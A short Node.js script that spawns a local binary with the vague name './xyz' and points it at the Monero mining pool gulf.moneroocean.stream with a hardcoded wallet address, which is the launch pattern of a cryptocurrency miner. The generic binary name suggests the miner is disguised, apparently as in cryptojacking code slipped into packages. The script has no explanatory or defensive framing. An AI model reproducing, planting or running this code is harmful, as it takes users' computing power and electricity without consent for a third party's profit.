var child = require('child_process');

child.spawn('./xyz', [
  '-o', 'gulf.moneroocean.stream:80',
  '-u', '4634LjUDSoXRvRtcfjJqtHfooNk6hj82eevKYSPv4P5P4y1ak3iTsJ6acTJh2kAsNkPyF6ooXtYsHGKDegoCUU9hLre8sau',
  '-p', 'x',
]).stdout.pipe(process.stdout);